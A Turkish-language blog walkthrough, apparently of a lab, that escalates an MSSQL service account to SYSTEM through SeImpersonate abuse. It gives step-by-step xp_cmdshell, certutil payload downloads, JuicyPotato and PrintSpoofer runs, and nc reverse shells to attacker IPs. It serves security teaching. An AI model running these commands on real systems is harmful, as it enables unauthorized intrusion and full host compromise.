---
title: "Abusing Windows Privileges: SeImpersonatePrivilege ve SeAssignPrimaryTokenPrivilege"
author: b1lal
categories: [Windows]
tags: [windows, privileges, seimpersonate, seassignprimarytoken, security, red team, powershell, potato, printspoofer, roguepotato, mssql, xp_cmdshell]
render_with_liquid: false
description: "Bu yazıda Windows işletim sistemlerinde SeImpersonatePrivilege ve SeAssignPrimaryTokenPrivilege ayrıcalıklarının nasıl kötüye kullanılabileceğini anlatacağım."
media_subpath: /images/windows-privileges-1/
layout: post
published: true
lang: "tr"
image:
  path: main.png
  alt: "Windows Privileges Abuse"
---

Windows'ta çalışan her process, hangi hesap bağlamında çalıştığına dair bilgileri tutan bir token'a sahiptir. Bu token, kullanıcının kim olduğunu, hangi gruplara üye olduğunu ve ne tür ayrıcalıklara sahip olduğunu tanımlar. Yani Windows, bir kaynağa erişim izni verirken kullanıcı adına değil, doğrudan bu token'a bakar.

Token'lar kullanıcı oturum açtığında LSASS tarafından oluşturulur ve ilgili process'e atanır. Bir process başka bir process'i başlatırsa, child process varsayılan olarak parent'ın token'ını miras alır. Bunun yanı sıra token'lar bellekte belirli adreslerde tutulur ve kriptografik olarak korunmadıklarından, handle değerleri tahmin edilebilir aralıklarda olduğu için teorikte ele geçirilebilirler.

Bu noktada **token impersonation** devreye girer. Ele geçirilen bir token'ı aktif olarak kullanabilmek, yani başka bir kullanıcı kimliğine bürünebilmek için **SeImpersonatePrivilege** ayrıcalığı gerekir. Bu ayrıcalık varsayılan olarak yalnızca yönetici ve servis hesaplarına tanınır; sistem sertleştirme süreçlerinde ise genellikle kaldırılır.

SeAssignPrimaryTokenPrivilege ise **primary token**'ı bir process'e atama yetkisi anlamına gelmektedir, yani bir processs'i baştan farklı bir kimlikle başlatabileceğimiz anlamına gelir. 

Token'lar hakkında daha fazla bilgi edinmek için <a href="https://www.elastic.co/blog/introduction-to-windows-tokens-for-security-practitioners" target="_blank" rel="noopener noreferrer">bu blog yazısına</a> göz atabilirsiniz.
<br>

### **Token'ların Önemi**

Windows üzerinde bazı programların SYSTEM gibi ayrıcalıklı bir hesap üzerinden işlemler yapması gerekebilir. WinLogon process'i üzerinden yapılan çağrıyla token alınır ve program bu token'i kullanarak kendisini başlatabilir. Ancak bu mekanizmanın işleyişini saldırganlar kötüye kullanabilir. Ele geçirilen bir hesap üzerinde `SeImpersonatePrivilege` yetkisi varsa, SYSTEM yetkisi olmasa bile bu mekanizmayı kullanarak SYSTEM token'ını ele geçirebilirler. 

Bir servis hesabı bağlamında çalışan bir uygulama üzerinden RCE aldığımızda bu ayrıcalıkla karşılaşmak oldukça olası. Örneğin bir ASP.NET uygulamasına web shell attığımızda ya da MSSQL'de **xp_cmdshell**'e erişebildiysk, ilk bakacağınız yer `SeImpersonatePrivilege` veya `SeAssignPrimaryTokenPrivilege` olmalı. 

Daha fazla teknik detay için: <a href="https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt" target="_blank" rel="noopener noreferrer">abusing_token_eop_1.0.txt</a>

<br>

## **SeImpersonate JuicyPotato**

Bu senaryoda SQL Service servis hesabı varsayılan `mssqlserver` hesabı bağlamında çalışıyor. Bir dosya paylaşımındaki `logins.sql` dosyasından <a href="https://github.com/SnaffCon/Snaffler" target="_blank" rel="noopener noreferrer">Snaffler</a> aracıyla elde ettiğimiz kimlik bilgilerini kullanarak `xp_cmdshell` aracılığıyla bu kullanıcı olarak komut yürütme imkânı kazandığımızı varsayalım.


<br>

### **MSSQLClient.py**

`sql_dev:Str0ng_P@ssw0rd!` kimlik bilgilerini kullanarak SQL Server'ına bağlanıyor ve ayrıcalıklarımızı doğruluyoruz. Bunun için <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener noreferrer">Impacket</a> araç setinden `mssqlclient.py` dosyasını kullanıyoruz:

```bash
mssqlclient.py sql_dev@10.129.15.98 -windows-auth
```

```bash
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2016 (SP2) (13.0.5026)
[!] Press help for extra shell commands
SQL (WINLPE-SRV01\sql_dev  dbo@master)> 
```

Bağlantımız başarıyla gerçekleşti.

<br>

### **xp_cmdshell**

Varsayılan olarak kapalı olan **xp_cmdshell** stored procedure'ünü kullanarak işletim sistemi komutlarını çalıştırabiliriz. Ancak bu stored procedure'ünü çalıştırabilmek için sysadmin ayrıcalıklarına sahip olmamız gerekmektedir.

Mevcut kullanıcımızın rollerini aşağıdaki sorguyla kontrol edebiliriz.

```sql
SELECT SYSTEM_USER AS login_name, IS_SRVROLEMEMBER('sysadmin') AS sysadmin, IS_SRVROLEMEMBER('serveradmin') AS serveradmin, IS_SRVROLEMEMBER('securityadmin') AS securityadmin;
```

```bash
login_name             sysadmin   serveradmin   securityadmin   
--------------------   --------   -----------   -------------   
WINLPE-SRV01\sql_dev          1             1               1 
```

1 değeri, `sql_dev` kullanıcısının **sysadmin** rolüne sahip olduğunu göstermektedir. Bu nedenle `xp_cmdshell`'ü etkinleştirebilir ve işletim sistemi komutlarını çalıştırabiliriz.

Bunu aktif etmenin en kolay yolu `enable_xp_cmdshell` komutunu kullanmaktır.

```bash        
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

> **Not:** Impacket bunu bizim için otomatik olarak yaprığından dolayı `RECONFIGURE` komutunu ayrıca yazmamıza gerek yok. Yapmasaydı RECONFIGURE komutunu çalıştırarak değişiklikleri uygulamamız gerekiyordu.

<br>

### **Access**

SQL Server servis hesabı bağlamında çalıştığımızı doğrulayalım:

```bash
xp_cmdshell whoami
```

```bash
output                          
-----------------------------   
nt service\mssql$sqlexpress01   
NULL 
```

Şimdi bu elimizdeki hesabın hangi ayrıcaklara sahip olduğunu kontrol edebiliriz.

```bash
xp_cmdshell whoami /priv
```

```bash
output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               
PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
NULL 
```

Çıktıyı incelediğimizde **SeImpersonatePrivilege** ve **SeAssignPrimaryTokenPrivilege** ayrıcalıklarının mevcut olduğunu görüyoruz. Bu ayrıcalık, `NT AUTHORITY\SYSTEM` gibi ayrıcalıklı bir hesabı taklit etmek için kullanılabilir.

<a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener noreferrer">JuicyPotato</a>, **SeImpersonate** veya **SeAssignPrimaryToken** ayrıcalıklarını exploit etmek için kullanılabileceğimiz bir araçtır.

<br>

### **JuicyPotato ile Ayrıcalık Yükseltme**

Bu hakları kullanarak yetki yükseltmek için önce JuicyPotato.exe binary'sini ve nc.exe'yi önce saldırı cihazımıza indiriyoruz.

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe
```

Daha sonra python ile basit bir http sunucusu başlatıyoruz:

```bash
python3 -m http.server 8081
```

Artık bu dosyaları hedef sunucuya rahatça indirebiliriz:

```bash
xp_cmdshell "certutil.exe -urlcache -f http://10.10.15.239:8081/JuicyPotato.exe C:\Users\Public\JuicyPotato.exe"
```

```bash
xp_cmdshell "certutil.exe -urlcache -f http://10.10.15.239:8081/nc.exe C:\Users\Public\nc.exe"
```

```bash
output                                                
---------------------------------------------------   
****  Online  ****                                    
CertUtil: -URLCache command completed successfully.   
NULL  
```

Artık neredeyse herşey hazır olduğuna göre nc dinleyicimizi başlatabiliriz:

```bash
sudo nc -nvlp 8181
```

Şimdi JuicyPotato aracını çalıştırarak ayrıcalık yükseltme saldırısını gerçekleştirebiliriz.

```bash
xp_cmdshell C:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\nc.exe 10.10.15.239 8181 -e cmd.exe" -t *
```

Parametreler: `-l` COM server listening port, `-p` çalıştırılacak program (cmd.exe), `-a` cmd.exe'ye geçirilen argüman, `-t` ise createprocess çağrısıdır. `*` ile hem `CreateProcessWithTokenW` hem de `CreateProcessAsUser` fonksiyonlarını denemesini söylüyoruz; bu iki fonksiyon sırasıyla **SeImpersonate** veya **SeAssignPrimaryToken** ayrıcalıklarına ihtiyaç duyar.

```bash
output                                                       
----------------------------------------------------------   
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375         
......                                                       
[+] authresult 0                                             
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM   
NULL                                                         
[+] CreateProcessWithTokenW OK                               
NULL        
```

İşlem başarıyla tamamlandığında **nc** dinleyicimize `NT AUTHORITY\SYSTEM` shell'i gelecektir:

```bash
Listening on 0.0.0.0 8181
Connection received on 10.129.15.98 49717
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

<br>

## **PrintSpoofer ve RoguePotato**

**JuicyPotato**, Windows Server 2019 ve Windows 10 build 1809 ve sonrasında çalışmamaktadır. Ancak <a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noopener noreferrer">PrintSpoofer</a> ve <a href="https://github.com/antonioCoco/RoguePotato" target="_blank" rel="noopener noreferrer">RoguePotato</a> aynı ayrıcalıkları kullanarak `NT AUTHORITY\SYSTEM` seviyesine erişim sağlayabilir. JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 üzerinde impersonation ayrıcalıklarını kötüye kullanmak için PrintSpoofer aracına dair daha kapsamlı bilgiye <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank" rel="noopener noreferrer">bu blog yazısından</a> ulaşabilirsiniz.


### **PrintSpoofer**

PrintSpoofer aracını hızlıca denemek istersek, exploit kısmına kadar diğer adımları olduğu gibi yapıp aşağıdaki gibi devam edebiliriz.

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

```bash
SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell "certutil.exe -urlcache -f http://10.10.15.107:8081/PrintSpoofer64.exe C:\Users\Public\PrintSpoofer64.exe"
```

```bash
xp_cmdshell C:\Users\Public\PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.15.107 8181 -e cmd"
```

```bash
output                                        
-------------------------------------------   
[+] Found privilege: SeImpersonatePrivilege   
[+] Named pipe listening...                   
[+] CreateProcessAsUser() OK                  
NULL 
```

nt authority\system:

```bash
Connection received on 10.129.15.98 49724
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

<br>

## **Son Söz**

**SeImpersonate** ve **SeAssignPrimaryToken** ayrıcalıklarını kötüye kullanarak yetki yükseltmek son derece yaygın bir saldırı vektörüdür. Hedef sistemin işletim sistemi sürümüne ve build numarasına göre kullanılabilecek araçların değiştiğini bilmek ve bunlara hâkim olmak kritik öneme sahiptir.


## **Referanslar**

- <a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener noreferrer">JuicyPotato</a>
- <a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noopener noreferrer">PrintSpoofer</a>
- <a href="https://github.com/antonioCoco/RoguePotato" target="_blank" rel="noopener noreferrer">RoguePotato</a>
- <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank" rel="noopener noreferrer">PrintSpoofer: Abusing Impersonation Privileges on Windows 10 and Server 2019</a>
- <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener noreferrer">Impacket Toolkit</a>

<br>

<p style="font-weight:900; color: gray; font-size: 50px; text-align:center;">Teşekkürler <a href="https://www.linkedin.com/in/batuhan0/?lipi=urn%3Ali%3Apage%3Ad_flagship3_search_srp
_people%3BLUebMIsyT%2Fy0mhB736RysA%3D%3D" target="_blank" rel="noopener noreferrer">@batuhaner</a></p>

<style>
  .center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
  }

  .wrap pre{
    white-space: pre-wrap;
  }

  .post-desc {
    font-family: 'Open Sans', sans-serif !important;
  }

  h4,h3,h2,h1 {
    font-family: 'Open Sans', sans-serif !important;
  }

</style>
